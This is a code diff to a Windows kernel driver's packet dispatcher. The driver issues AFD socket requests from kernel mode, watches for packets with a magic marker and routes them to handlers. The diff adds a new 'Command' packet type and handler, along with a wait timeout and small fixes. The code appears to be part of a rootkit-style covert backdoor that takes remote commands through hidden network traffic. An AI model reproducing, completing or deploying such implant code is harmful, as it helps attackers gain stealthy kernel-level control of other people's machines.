@@ -7,6 +7,7 @@
 #include "PacketDispatch.h"
 #include "PingPacketHandler.h"
 #include "XorPacketHandler.h"
+#include "CommandPacketHandler.h"
 
 /**
 	Populate the necessary members in the PacketDispatch class.
@@ -56,9 +57,15 @@ PacketDispatch::SendSynchronousAfdRequest (
 	PIRP Irp;
 	PIO_STACK_LOCATION irpStack;
 	PKEVENT socketEvent;
+	LARGE_INTEGER timeout;
 
 	socketEventHandle = NULL;
 	socketEvent = NULL;
+
+	//
+	// Relative time is negative.
+	//
+	timeout.QuadPart = -MILLISECONDS_TO_SYSTEMTIME(MAX_OPERATION_TIME);
 
 	//
 	// Create the event for the socket operation.
@@ -131,7 +138,7 @@ PacketDispatch::SendSynchronousAfdRequest (
 	//
 	if (status == STATUS_PENDING)
 	{
-		ZwWaitForSingleObject(socketEventHandle, FALSE, NULL);
+		ZwWaitForSingleObject(socketEventHandle, FALSE, &timeout);
 		status = IoStatusBlock->Status;
 	}
 
@@ -294,6 +301,7 @@ PacketDispatch::ReceiveBuffer (
 	SIZE_T usermodeBufferSize;
 	IO_STATUS_BLOCK dummyIOSB;
 
+	memset(&dummyIOSB, 0, sizeof(dummyIOSB));
 	receiveInfoUsermode = NULL;
 	usermodeBuffer = NULL;
 	usermodeBufferSize = BufferSize;
@@ -312,7 +320,7 @@ PacketDispatch::ReceiveBuffer (
 	status = ZwAllocateVirtualMemory(NtCurrentProcess(), RCAST<PVOID*>(&receiveInfoUsermode), 0, &receiveInfoSize, MEM_COMMIT, PAGE_READWRITE);
 	if (NT_SUCCESS(status) == FALSE)
 	{
-		DBGPRINT("PacketDispatch!receiveBuffer: Failed to allocate a user-mode buffer for the AFD_receive_INFO structure with status 0x%X.", status);
+		DBGPRINT("PacketDispatch!ReceiveBuffer: Failed to allocate a user-mode buffer for the AFD_receive_INFO structure with status 0x%X.", status);
 		goto Exit;
 	}
 
@@ -413,6 +421,7 @@ PacketDispatch::PopulateBasePacket (
 	bytesAfterMagic = PacketSize - PacketMagicOffset - MAGIC_SIZE;
 	*RemainingBytes = 0;
 	receiveRetryCount = 0;
+	bytesReceived = 0;
 
 	//
 	// Copy over what we can.
@@ -648,6 +657,7 @@ PacketDispatch::Dispatch (
 
 	PPING_PACKET_HANDLER pingHandler;
 	PXOR_PACKET_HANDLER xorHandler;
+	PCOMMAND_PACKET_HANDLER commandHandler;
 
 	handler = NULL;
 	handlerTag = 0;
@@ -660,15 +670,21 @@ PacketDispatch::Dispatch (
 	//
 	switch (FullPacket->Type)
 	{
-	case Ping:
+	case PACKET_TYPE::Ping:
 		pingHandler = new (NonPagedPool, PING_PACKET_HANDLER_TAG) PingPacketHandler(this);
 		handler = pingHandler;
 		handlerTag = PING_PACKET_HANDLER_TAG;
 		break;
-	case Xor:
+	case PACKET_TYPE::Xor:
 		xorHandler = new (NonPagedPool, XOR_PACKET_HANDLER_TAG) XorPacketHandler(this);
 		handler = xorHandler;
 		handlerTag = XOR_PACKET_HANDLER_TAG;
+		break;
+	case PACKET_TYPE::Command:
+		commandHandler = new (NonPagedPool, COMMAND_PACKET_HANDLER_TAG) CommandPacketHandler(this);
+		handler = commandHandler;
+		handlerTag = COMMAND_PACKET_HANDLER_TAG;
+		break;
 	default:
 		status = STATUS_NOT_SUPPORTED;
 		break;
